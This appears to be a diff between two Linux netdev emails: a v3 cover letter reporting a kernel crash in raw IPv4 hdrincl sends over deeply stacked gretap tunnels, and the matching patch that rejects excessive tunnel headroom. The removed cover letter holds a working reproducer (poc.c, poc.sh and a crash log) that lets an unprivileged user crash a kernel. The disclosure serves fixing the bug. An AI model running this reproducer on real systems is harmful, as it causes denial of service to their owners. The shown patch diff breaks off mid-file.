@@ -1,61 +1,63 @@
 Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 702DF2C21FF
-	for <netdev@vger.kernel.org>; Sun,  2 Aug 2026 18:50:35 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 98E55318EDA
+	for <netdev@vger.kernel.org>; Sun,  2 Aug 2026 18:50:45 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.42
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785696637; cv=none; b=pFNDSbcbAYDkpR5S0o7IKMzJtVNjxJ+Ot5dvtIaIWeLfCznsGR2tSdb21A8UPGuf0JgGZBX7mkZVNuaNJK01yxZNa/oqzLj5vzOk99CgSwhFygyPf6g+ssPuSJaRbpQe/r05xuX3uTRUx2jAD8cQzFFoItMZ+He/EQ6GDMXExpI=
+	t=1785696647; cv=none; b=NXavUxPMtPf6a6Y/1LJhDbCk2wQ1Rajp3VHNf9LkvXo0oPNsmZrF7IM/RjL8ZPWW7Sm+11g9ZaeWcED0SftomhPEA4D7PrBmDm/8ayRK0XF9sbsKq7oMPbD88FQroZFT6sw1EvrpxhjGnoG9XLdvLk0uU3SJZAx75Z+Ky982t3w=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785696637; c=relaxed/simple;
-	bh=53pAORPmaAPrzX8X62sp3A8MMT19B1BLedUXdsfqF1s=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=qYAMdE9gBbiHIT0SvI5+rlyyADWSpcdUwq0YGFmQJgeolvh5GxwVOaRZFPK3TOQ0kbJlIXQldgxsnWSks8RGXP8l54+30VhUa/cGs7wFNj33saE/qLIlL5D+FBAvRzHrqLlBh6vqS+FGAyHlgKB1MVvHBj2ZN+h/nQ+aj/PEOJc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=JM7g7VX5; arc=none smtp.client-ip=209.85.216.42
+	s=arc-20240116; t=1785696647; c=relaxed/simple;
+	bh=LmLCWT4/4uUD3zcPsTniG0TUvi5ybnkkWdM+sBagQP0=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=a2il9t0L3iEL4VUieEdRfIFA5DAX0nafYwYyK4ka+JX3bvOxJCICN55LFUqg2+UbAcbCoPAWQaj4QFssKErmqvpeB0aDvxLEstM0a+0teECoKrpP0k/17DYe5VJ887UFsxTTteYLA+sXbJ38H04SLeAjZ+oDZq2XePmYqqHNA8E=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Qz988Y7t; arc=none smtp.client-ip=209.85.216.42
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="JM7g7VX5"
-Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-38de840f2f0so1649778a91.0
-        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 11:50:35 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Qz988Y7t"
+Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-38dcbade417so2466013a91.1
+        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 11:50:45 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1785696635; x=1786301435; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=6irk+suRFzUVjUivt9Y8sJ2O5S8J7/rhO3kkQB6egcY=;
-        b=JM7g7VX5kArm0oZuaYXUNnzgI1CpHVZT9QBkstbsut3UTg6sF5c8wV/AfRXzuEydbh
-         ardRmo3EsxEOQLEFDKsOjYT0yX213wFYRFvnPACZet7qT0bapleo7XlsOGBbPP2O97ez
-         AkCu7iFi03j6YWj2zzKirQItiUE0MRvbQQUceRQLfqCeOj+47fVuh1zXB7gG7N0XdauN
-         8YvT19nddPbz/1KHXbbz4VeBcheFL7OS3X/m5JPxXcJP2wfUKjF6Ko5H2T99/89GsaUo
-         1SDVvt3Bs+LhGB/ZrjMErv2PxenW7SujOXl5CCkXsDsf0+FE6rr3aKtaXiBy6KXY4FSN
-         nqug==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785696635; x=1786301435;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1785696645; x=1786301445; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=6irk+suRFzUVjUivt9Y8sJ2O5S8J7/rhO3kkQB6egcY=;
-        b=bnC3g02RMsfYucJbWC0MndkBJ/VQ+K/4dR4Jcj0j22TdnN6QP1heARuYJ8JJBPkmbD
-         jQm1gk6edu10Nlf09M5igpOGaZwM0FR57OvdL6YlolpAbfA9n8EFGSZpLDS1VMwQBceG
-         eGK3KU0XbYFSZTszzWfJgz6qosHNCfcDauYp2g0r42DaOBRNmo4JQe1PT17NJRRllc+T
-         nxr9wMEmiND0VnQhNN8q5rM5I1P9v674qStFTbZLBXWrelqvy3ruoh7oqns0YT2wHTpf
-         L5+IQeFJs0zg22ySgekpklnblZV+9hHv9eEb+YGZ8pX+7xS+gYtmUigCzcioHIjztQbb
-         vysQ==
-X-Gm-Message-State: AOJu0YwyyPBA8xjDpdqSPTi+YL12kCBLBxk4Ph1lkKaWtfruZ3Nahxkr
-	K+IVJRrCgQ1s6rT6D34Smlc6je4KJfcsbQTx5EAzvke2xWeb7ecwiiJp8II9gxCWxFhNBBus9we
-	N+8qVKFBq
-X-Gm-Gg: AR+sD11GsYT6reH1ioon6tutVMFoDz00BTDF23JU4qXDuVZ6zv0259z85NGakhaLMyu
-	8AaLBbGH/bF87mBcuUWUBfrg/FjGmrS5i51TdpBoL1FK+ZIbg6i4RVqXcPDB13fauXJwpnAjQnj
-	1aHcGiMEtP2679zwXoZbkyAB6B4dYVfGFxfRqQWZCIbLACAcRJ9+/IyHedX375Fo28frjtqqaLK
-	PYSxBvVseW6RIab5Xu4z9XXk5RwKZoWa1wzU2eV5un/+7NvwZUHFUADdxD6WJ+Nqb2CH8l39SSq
-	kQ/IGE3CX3yRzLCIQHcRonqM/+TUR6o1lkXXbWWSFzu7RvnC0Jm7BLsA3NvwtNRH/hpRnjz+Vfr
-	kfBX8Ro6rf8I9kI+XohpHtGt03UjiBn0gFbmUhX45icnNKo13lYnptxTJV8wc2Aacff8WnpqFS8
-	unZnLLFh+BU2ExQDOMqaaiSVWWd/NMEQBlvSkkHlh082AXc2dWb4LTtdwHPM24eijIws9trQ==
-X-Received: by 2002:a17:90a:ec87:b0:38e:5741:5173 with SMTP id 98e67ed59e1d1-38fbc511a56mr6487245a91.29.1785696634509;
-        Sun, 02 Aug 2026 11:50:34 -0700 (PDT)
+        bh=UtpeFkg4AA98jetm2vO6q263mNBUF8xD1A66L1T1z0k=;
+        b=Qz988Y7t6Q4wFWkXhHTaSY4mAAq3oQOCMhz0mUotKG5+iHdjoi949HDBfLW1vRW84F
+         ocyzlSLHbpIraFAzBPtb82RQ17v//jeQF49k2Cf/QFGIL+TUjQcOXVt0fLQETPH05nLQ
+         IW4l5DLY7jLiVXrW/Lz/vr0aBHf08eSdpzkgasU7IovZzWtV0+ZoxCoGR2vQPGMYdeYi
+         6/dgTLFjdZSshRvXQ0Xxw7LR6jPcI2JXqYrq6vGNl18fd6Y/IrinejvXZw0NSZ+FLOmy
+         QC3Zg39GcXAXkIAy/Y+4GVe1YVBErp9l01cyXoaNFaxneVpElpcLv2megC0VTGwAQDeX
+         QjEQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1785696645; x=1786301445;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=UtpeFkg4AA98jetm2vO6q263mNBUF8xD1A66L1T1z0k=;
+        b=ALnOI/vJaQPqvbAxK1e60e3F8lPLc+nzvpq8d9kw2S9hV+cSutE1kC9QaBKTm/8Sv8
+         NH7suTlWI7+lh9L/QofuMGWMXRH3bMrYFnWBAxhi/t7qIauDQCuzKKOcNUy4eEHK1tTO
+         pG9yu8wfWHdkBHn6bbynVrQPHkokNeTnkSvfNgN1hdEtrkdX9RPK6zn+cfTiJL6elp1D
+         amM/9AZp0gVArleS8F4sNY1ca5V/0un9BxOQrTZ/qlS3FGhUyRtGlFy9LIQYMLbYntFp
+         go68ZOEIJIkFXEEWcvql+OzAnTOlLClkddDnAD1eO/LAo3Xn0wDvshfQXMMk9i/Fd2Bf
+         oBpw==
+X-Gm-Message-State: AOJu0Yx0E9UHgOueFmUos5+EzDteyHEsdx6zbd4rgrIDrTEqXZBvamTh
+	5CCUFtlnaqUIljQWpfc3lkepMdGd2HHrMTfFuHpUGEje3NGg9r8PuTQrJrhZD5Q2QGDUi7cHZds
+	iLzD/g+c6
+X-Gm-Gg: AR+sD10NkjJ598+ybqr5/etfVBgIKaATAGUErXFz8St3001u6nsgpGqc1HhJdCCsRIw
+	BMjbAGhybKvDzbwDPfz4uMu4TqiuUjYzMtKsnSKkwxkeclfr/FHxL1ayFKgF4jPgRdUCYMzqXfu
+	lM3ZpAHQc+zz+qTsjay+JJNfeHm6xx6I0iSc4GiFgnkVGkyXAlMGN+dkXvAEvqPwa5L8RIZI6jZ
+	Km3UMsDqcTMSnuzl8uDYbEBWSSmAAiueRM53wCKDdGkzK5qY4jqxSWkBWBCl8nu34qxWRot72HW
+	5QEhQqF75uNfJl7UbrNRj/JnS9s4N8TGbKs95R8qbVsMXXCo91QriHlN4OoNzbgoJhdFoIgT4Gd
+	ZQh/5nZWO1gffZ+cTIGhIA5D54FYg3So9mnylZdyq6JUipFGL0iR3KKII4O25eF1uVFRO9XfjNn
+	8aA+bNWfrKJlMZm5vYQkpcwVlRvyJz57u/5CCGp121pWVtl0obHFhYDxXdH1tmn54QHoxFoA==
+X-Received: by 2002:a17:90b:4c42:b0:37f:9cdf:f0ac with SMTP id 98e67ed59e1d1-38fbc4cf1b2mr7353194a91.27.1785696644698;
+        Sun, 02 Aug 2026 11:50:44 -0700 (PDT)
 Received: from localhost.localdomain ([115.192.251.96])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38fb29cbac9sm2961867a91.7.2026.08.02.11.50.24
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38fb29cbac9sm2961867a91.7.2026.08.02.11.50.34
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sun, 02 Aug 2026 11:50:33 -0700 (PDT)
+        Sun, 02 Aug 2026 11:50:42 -0700 (PDT)
 From: Zihan Xi <zihanx@nebusec.ai>
 To: netdev@vger.kernel.org
 Cc: dsahern@kernel.org,
@@ -76,10 +78,12 @@ Cc: dsahern@kernel.org,
 	lirongqing@baidu.com,
 	vega@nebusec.ai,
 	zihanx@nebusec.ai
-Subject: [PATCH net v3 0/1] net: ip_tunnel: reject excessive tunnel stacking headroom
-Date: Sun,  2 Aug 2026 18:49:16 +0000
-Message-ID: <cover.1785691607.git.zihanx@nebusec.ai>
+Subject: [PATCH net v3 1/1] net: ip_tunnel: reject excessive tunnel stacking headroom
+Date: Sun,  2 Aug 2026 18:49:17 +0000
+Message-ID: <a25901403c69929d6f72ba802b3ab912f2adbe63.1785691607.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.47.3
+In-Reply-To: <cover.1785691607.git.zihanx@nebusec.ai>
+References: <cover.1785691607.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -88,228 +92,29 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+raw_send_hdrinc() and rawv6_send_hdrinc() reserve LL headroom before
+storing skb header offsets in 16-bit fields. If an egress device has a
+very large LL_RESERVED_SPACE(), skb_reset_network_header() stores a
+truncated network_header offset and the hdrincl path can later copy the
+user header to the wrong location.
 
-We found and validated a issue in net/ipv4/raw.c. The bug is reachable by a
-non-root user via user and net namespace.
-We've tested it, and it should not affect any other functionality.
+The reproducer creates a very deep gretap stack. Each new tunnel derives
+its needed_headroom from the lower device, so the stack can grow the
+resulting LL headroom beyond what skb header offsets can represent.
 
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-
----- details below ----
-
-Bug details:
-
-raw_send_hdrinc() and rawv6_send_hdrinc() reserve LL headroom before storing
-skb header offsets in 16-bit fields. Since commit 1a37e412a022 ("net: Use
-16bits for *_headers fields of struct skbuff"), these offsets must stay
-representable, and U16_MAX is also the unset sentinel for transport_header.
-
-The reproducer builds a very deep gretap stack. Each IPv4 tunnel derives its
-needed_headroom from the lower device in ip_tunnel_bind_dev(), so the final
-LL_RESERVED_SPACE(dev) can grow beyond what the skb header offset fields can
-represent. On the IPv4 hdrincl path, skb_reserve(skb, hlen) followed by
-skb_reset_network_header(skb) then stores a truncated network_header offset.
-raw_send_hdrinc() copies the userspace IPv4 header to ip_hdr(skb) at the
-wrapped offset, and the malformed skb later faults in eth_header().
-
-IPv4 also has a second boundary at hlen + iphlen, because the transport heade
-is advanced by the user-controlled IPv4 header length and U16_MAX itself is
-not a valid stored transport offset.
-
-This version rejects IPv4 tunnel configurations when the computed tunnel
-headroom would make LL_RESERVED_SPACE(dev) exceed the skb header offset range
-needed by raw IPv4 hdrincl. That rejects the bad gretap stack at control time
-instead of adding checks to later per-packet hot paths. Small raw IPv4 and
-IPv6 hdrincl guards remain as a final bound check for devices that are not
+Reject IPv4 tunnel configurations when the computed headroom would make
+LL_RESERVED_SPACE() exceed the skb header offset range needed by raw
+IPv4 hdrincl. This rejects the bad tunnel stack at configuration time
+instead of checking every packet in later hot paths. Keep small raw IPv4
+and IPv6 hdrincl guards as a final bound check for devices that are not
 created through the IPv4 tunnel control path.
 
-The reproducer below exercises the IPv4 hdrincl crash path. The primary fix
-is the IPv4 tunnel control-time headroom check; the raw IPv6 change is only a
-matching hdrincl boundary guard and is not covered by the same crash log.
-
-We did not use packetdrill for the reproducer because the trigger depends on
-constructing a very deep gretap device stack so that LL_RESERVED_SPACE(dev)
-reaches the truncation boundary before the raw hdrincl send. packetdrill can
-express the final packet send, but not this device-topology setup as the main
-trigger condition.
-
-Reproducer:
-
-    gcc -O2 -static -o poc poc.c
-    unshare -Urn ./poc
-    Actual trigger wrapper used in validation:
-    unshare -Urn ./poc.sh
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-#define _GNU_SOURCE
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <linux/if.h>
-#include <netinet/ip.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <unistd.h>
-
-static uint16_t ip_checksum(const void *buf, size_t len)
-{
-	const uint8_t *p = buf;
-	uint32_t sum = 0;
-
-	while (len > 1) {
-		sum += ((uint32_t)p[0] << 8) | p[1];
-		p += 2;
-		len -= 2;
-	}
-
-	if (len)
-		sum += (uint32_t)p[0] << 8;
-
-	while (sum >> 16)
-		sum = (sum & 0xffffU) + (sum >> 16);
-
-	return (uint16_t)~sum;
-}
-
-int main(int argc, char **argv)
-{
-	static const char payload[] = "ABCD";
-	const char *ifname = argc > 1 ? argv[1] : "g1560";
-	const char *dst_str = argc > 2 ? argv[2] : "192.0.2.2";
-	const char *src_str = argc > 3 ? argv[3] : "192.0.2.1";
-	struct sockaddr_in dst = {
-		.sin_family = AF_INET,
-	};
-	struct iphdr iph = {
-		.version = 4,
-		.ihl = 5,
-		.tos = 0,
-		.tot_len = htons(sizeof(struct iphdr) + sizeof(payload) - 1),
-		.id = htons(0x1234),
-		.frag_off = 0,
-		.ttl = 64,
-		.protocol = 253,
-		.check = 0,
-	};
-	unsigned char packet[sizeof(iph) + sizeof(payload) - 1];
-	int fd;
-	ssize_t n;
-
-	if (inet_pton(AF_INET, src_str, &iph.saddr) != 1) {
-		fprintf(stderr, "bad src %s\n", src_str);
-		return 1;
-	}
-	if (inet_pton(AF_INET, dst_str, &iph.daddr) != 1) {
-		fprintf(stderr, "bad dst %s\n", dst_str);
-		return 1;
-	}
-	if (inet_pton(AF_INET, dst_str, &dst.sin_addr) != 1) {
-		fprintf(stderr, "bad sockaddr dst %s\n", dst_str);
-		return 1;
-	}
-
-	iph.check = ip_checksum(&iph, sizeof(iph));
-	memcpy(packet, &iph, sizeof(iph));
-	memcpy(packet + sizeof(iph), payload, sizeof(payload) - 1);
-
-	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-	if (fd < 0) {
-		perror("socket");
-		return 1;
-	}
-
-	{
-		int one = 1;
-
-		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-			perror("setsockopt(IP_HDRINCL)");
-			close(fd);
-			return 1;
-		}
-		if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, ifname,
-			       strlen(ifname) + 1) < 0) {
-			perror("setsockopt(SO_BINDTODEVICE)");
-			close(fd);
-			return 1;
-		}
-	}
-
-	n = sendto(fd, packet, sizeof(packet), 0,
-		   (struct sockaddr *)&dst, sizeof(dst));
-	if (n < 0) {
-		perror("sendto");
-		close(fd);
-		return 1;
-	}
-
-	printf("sent %zd bytes via %s to %s\n", n, ifname, dst_str);
-	close(fd);
-	return 0;
-}
-------END poc.c--------
-
-------BEGIN poc.sh------
-#!/bin/sh
-set -eu
-
-DEPTH="${DEPTH:-1560}"
-TOP="g${DEPTH}"
-
-if ip route show default 2>/dev/null | grep -q .; then
-	echo "run inside an isolated netns, e.g. unshare -n $0 or unshare -Urn $0" >&2
-	exit 1
-fi
-
-ip link add dummy0 type dummy
-ip link set dummy0 up mtu 100000
-
-lower="dummy0"
-i=1
-while [ "$i" -le "$DEPTH" ]; do
-	a=$(( (i / 250) % 250 + 1 ))
-	b=$(( i % 250 + 1 ))
-	lip="10.${a}.${b}.1"
-	rip="10.${a}.${b}.2"
-	ip link add "g${i}" type gretap local "${lip}" remote "${rip}" dev "${lower}" key 1
-	lower="g${i}"
-	i=$((i + 1))
-done
-
-ip link set "${TOP}" up
-ip addr add 192.0.2.1/24 dev "${TOP}"
-ip neigh replace 192.0.2.2 lladdr 02:11:22:33:44:55 nud permanent dev "${TOP}"
-
-exec ./poc "${TOP}" 192.0.2.2 192.0.2.1
-------END poc.sh--------
-
-----BEGIN crash log----
-[   52.208710] BUG: unable to handle page fault for address: ffffa3986611fffe
-[   52.220274] #PF: supervisor write access in kernel mode
-[   52.228822] #PF: error_code(0x0002) - not-present page
-[   52.249792] Oops: Oops: 0002 [#1] SMP NOPTI
-[   52.313650] RIP: 0010:eth_header (net/ethernet/eth.c:86)
-[   52.585894] Call Trace:
-[   52.591902]  neigh_resolve_output (include/linux/netdevice.h:3503 net/core/neighbour.c:1611 net/core/neighbour.c:1596)
-[   52.597910]  ip_finish_output2 (include/net/neighbour.h:560 (discriminator 2) net/ipv4/ip_output.c:236 (discriminator 2))
-[   52.603665]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
-[   52.616159]  raw_sendmsg (net/ipv4/raw.c:677)
-[   52.638531]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
-[   52.643321]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/socket.c:2255)
-[   52.648330]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
-[   52.653123]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
------END crash log-----
-
-Best regards,
-Zihan Xi
-
+Fixes: 1a37e412a022 ("net: Use 16bits for *_headers fields of struct skbuff")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: Codex:gpt-5.4
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+---
 changes in v3:
   - Rework the fix to reject excessive IPv4 tunnel headroom at
     configuration time, following Willem de Bruijn's feedback.
@@ -325,14 +130,419 @@ changes in v2:
     transport-header recomputation paths instead of relying on raw hdrincl
     entry guards alone.
   - v1 Link: https://lore.kernel.org/all/cover.1785346409.git.zihanx@nebusec.ai/
-
 ---
+ include/net/ip_tunnels.h |   5 +-
+ net/ipv4/ip_gre.c        |   8 +--
+ net/ipv4/ip_tunnel.c     | 138 ++++++++++++++++++++++++++-------------
  net/ipv4/ip_vti.c        |   4 +-
  net/ipv4/ipip.c          |   4 +-
  net/ipv4/raw.c           |   3 +
  net/ipv6/raw.c           |   4 ++
  7 files changed, 111 insertions(+), 55 deletions(-)
 
+diff --git a/include/net/ip_tunnels.h b/include/net/ip_tunnels.h
+index d708b66e5..0102fe387 100644
+--- a/include/net/ip_tunnels.h
++++ b/include/net/ip_tunnels.h
+@@ -425,10 +425,11 @@ int ip_tunnel_rcv(struct ip_tunnel *tunnel, struct sk_buff *skb,
+ 		  const struct tnl_ptk_info *tpi, struct metadata_dst *tun_dst,
+ 		  bool log_ecn_error);
+ int ip_tunnel_changelink(struct net_device *dev, struct nlattr *tb[],
+-			 struct ip_tunnel_parm_kern *p, __u32 fwmark);
++			 struct ip_tunnel_parm_kern *p, __u32 fwmark,
++			 struct netlink_ext_ack *extack);
+ int ip_tunnel_newlink(struct net *net, struct net_device *dev,
+ 		      struct nlattr *tb[], struct ip_tunnel_parm_kern *p,
+-		      __u32 fwmark);
++		      __u32 fwmark, struct netlink_ext_ack *extack);
+ void ip_tunnel_setup(struct net_device *dev, unsigned int net_id);
+ 
+ bool ip_tunnel_netlink_encap_parms(struct nlattr *data[],
+diff --git a/net/ipv4/ip_gre.c b/net/ipv4/ip_gre.c
+index 0ba1e94e9..6907688d0 100644
+--- a/net/ipv4/ip_gre.c
++++ b/net/ipv4/ip_gre.c
+@@ -1424,7 +1424,7 @@ static int ipgre_newlink(struct net_device *dev,
+ 	if (err < 0)
+ 		return err;
+ 	return ip_tunnel_newlink(params->link_net ? : dev_net(dev), dev, tb, &p,
+-				 fwmark);
++				 fwmark, extack);
+ }
+ 
+ static int erspan_newlink(struct net_device *dev,
+@@ -1445,7 +1445,7 @@ static int erspan_newlink(struct net_device *dev,
+ 	if (err)
+ 		return err;
+ 	return ip_tunnel_newlink(params->link_net ? : dev_net(dev), dev, tb, &p,
+-				 fwmark);
++				 fwmark, extack);
+ }
+ 
+ static int ipgre_changelink(struct net_device *dev, struct nlattr *tb[],
+@@ -1468,7 +1468,7 @@ static int ipgre_changelink(struct net_device *dev, struct nlattr *tb[],
+ 	if (err < 0)
+ 		return err;
+ 
+-	err = ip_tunnel_changelink(dev, tb, &p, fwmark);
++	err = ip_tunnel_changelink(dev, tb, &p, fwmark, extack);
+ 	if (err < 0)
+ 		return err;
+ 
+@@ -1500,7 +1500,7 @@ static int erspan_changelink(struct net_device *dev, struct nlattr *tb[],
+ 	if (err < 0)
+ 		return err;
+ 
+-	err = ip_tunnel_changelink(dev, tb, &p, fwmark);
++	err = ip_tunnel_changelink(dev, tb, &p, fwmark, extack);
+ 	if (err < 0)
+ 		return err;
+ 
+diff --git a/net/ipv4/ip_tunnel.c b/net/ipv4/ip_tunnel.c
+index 9d114bd57..5e4f56c0e 100644
+--- a/net/ipv4/ip_tunnel.c
++++ b/net/ipv4/ip_tunnel.c
+@@ -9,6 +9,7 @@
+ #include <linux/module.h>
+ #include <linux/types.h>
+ #include <linux/kernel.h>
++#include <linux/limits.h>
+ #include <linux/slab.h>
+ #include <linux/uaccess.h>
+ #include <linux/skbuff.h>
+@@ -277,16 +278,31 @@ static struct net_device *__ip_tunnel_create(struct net *net,
+ 	return ERR_PTR(err);
+ }
+ 
+-static int ip_tunnel_bind_dev(struct net_device *dev)
++static bool ip_tunnel_headroom_too_large(const struct net_device *dev,
++					 unsigned int needed_headroom)
++{
++	unsigned int hlen;
++
++	hlen = ((dev->hard_header_len + needed_headroom) &
++		~(HH_DATA_MOD - 1)) + HH_DATA_MOD;
++
++	return hlen >= U16_MAX - (sizeof(struct iphdr) + MAX_IPOPTLEN);
++}
++
++static int ip_tunnel_calc_dev_config(struct net_device *dev,
++				     const struct ip_tunnel_parm_kern *parms,
++				     __u32 fwmark,
++				     unsigned int *needed_headroom,
++				     int *mtu,
++				     struct netlink_ext_ack *extack)
+ {
+ 	struct net_device *tdev = NULL;
+ 	struct ip_tunnel *tunnel = netdev_priv(dev);
+-	const struct iphdr *iph;
++	const struct iphdr *iph = &parms->iph;
+ 	int hlen = LL_MAX_HEADER;
+-	int mtu = ETH_DATA_LEN;
+ 	int t_hlen = tunnel->hlen + sizeof(struct iphdr);
+ 
+-	iph = &tunnel->parms.iph;
++	*mtu = ETH_DATA_LEN;
+ 
+ 	/* Guess output device to choose reasonable mtu and needed_headroom */
+ 	if (iph->daddr) {
+@@ -294,36 +310,58 @@ static int ip_tunnel_bind_dev(struct net_device *dev)
+ 		struct rtable *rt;
+ 
+ 		ip_tunnel_init_flow(&fl4, iph->protocol, iph->daddr,
+-				    iph->saddr, tunnel->parms.o_key,
++				    iph->saddr, parms->o_key,
+ 				    iph->tos & INET_DSCP_MASK, tunnel->net,
+-				    tunnel->parms.link, tunnel->fwmark, 0, 0);
++				    parms->link, fwmark, 0, 0);
+ 		rt = ip_route_output_key(tunnel->net, &fl4);
+ 
+ 		if (!IS_ERR(rt)) {
+ 			tdev = rt->dst.dev;
+ 			ip_rt_put(rt);
+ 		}
+-		if (dev->type != ARPHRD_ETHER)
+-			dev->flags |= IFF_POINTOPOINT;
+-
+-		dst_cache_reset(&tunnel->dst_cache);
+ 	}
+ 
+-	if (!tdev && tunnel->parms.link)
+-		tdev = __dev_get_by_index(tunnel->net, tunnel->parms.link);
++	if (!tdev && parms->link)
++		tdev = __dev_get_by_index(tunnel->net, parms->link);
+ 
+ 	if (tdev) {
+ 		hlen = tdev->hard_header_len + tdev->needed_headroom;
+-		mtu = min(tdev->mtu, IP_MAX_MTU);
++		*mtu = min(tdev->mtu, IP_MAX_MTU);
++	}
++
++	*needed_headroom = t_hlen + hlen;
++	if (ip_tunnel_headroom_too_large(dev, *needed_headroom)) {
++		NL_SET_ERR_MSG(extack, "tunnel headroom exceeds skb header offset limit");
++		return -E2BIG;
+ 	}
+ 
+-	dev->needed_headroom = t_hlen + hlen;
+-	mtu -= t_hlen + (dev->type == ARPHRD_ETHER ? dev->hard_header_len : 0);
++	*mtu -= t_hlen + (dev->type == ARPHRD_ETHER ? dev->hard_header_len : 0);
++	if (*mtu < IPV4_MIN_MTU)
++		*mtu = IPV4_MIN_MTU;
+ 
+-	if (mtu < IPV4_MIN_MTU)
+-		mtu = IPV4_MIN_MTU;
++	return 0;
++}
++
++static int ip_tunnel_bind_dev(struct net_device *dev, int *mtu,
++			      struct netlink_ext_ack *extack)
++{
++	struct ip_tunnel *tunnel = netdev_priv(dev);
++	unsigned int needed_headroom;
++	int err;
++
++	err = ip_tunnel_calc_dev_config(dev, &tunnel->parms, tunnel->fwmark,
++					&needed_headroom, mtu, extack);
++	if (err)
++		return err;
++
++	if (tunnel->parms.iph.daddr) {
++		if (dev->type != ARPHRD_ETHER)
++			dev->flags |= IFF_POINTOPOINT;
++		dst_cache_reset(&tunnel->dst_cache);
++	}
++	dev->needed_headroom = needed_headroom;
+ 
+-	return mtu;
++	return 0;
+ }
+ 
+ static struct ip_tunnel *ip_tunnel_create(struct net *net,
+@@ -340,7 +378,9 @@ static struct ip_tunnel *ip_tunnel_create(struct net *net,
+ 	if (IS_ERR(dev))
+ 		return ERR_CAST(dev);
+ 
+-	mtu = ip_tunnel_bind_dev(dev);
++	err = ip_tunnel_bind_dev(dev, &mtu, NULL);
++	if (err)
++		goto err_dev_set_mtu;
+ 	err = dev_set_mtu(dev, mtu);
+ 	if (err)
+ 		goto err_dev_set_mtu;
+@@ -859,13 +899,20 @@ void ip_tunnel_xmit(struct sk_buff *skb, struct net_device *dev,
+ }
+ EXPORT_SYMBOL_GPL(ip_tunnel_xmit);
+ 
+-static void ip_tunnel_update(struct ip_tunnel_net *itn,
+-			     struct ip_tunnel *t,
+-			     struct net_device *dev,
